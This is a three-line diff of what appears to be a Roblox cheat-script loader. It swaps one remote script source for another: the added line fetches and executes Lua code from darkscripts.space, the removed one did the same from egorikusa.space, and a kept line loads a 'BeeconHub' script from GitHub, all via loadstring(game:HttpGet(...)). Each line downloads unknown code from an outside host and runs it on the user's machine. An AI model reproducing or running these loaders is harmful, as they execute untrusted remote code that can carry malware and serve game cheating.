@@ -1,2 +1,2 @@
+loadstring(game:HttpGet('https://darkscripts.space/scripts/4245a0f082.lua', true))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBossScript/BeeconHub/main/BeeconHub"))()
-loadstring(game:HttpGet("https://egorikusa.space/7bcfe2fb00a4902d6b70a65c.lua", true))()
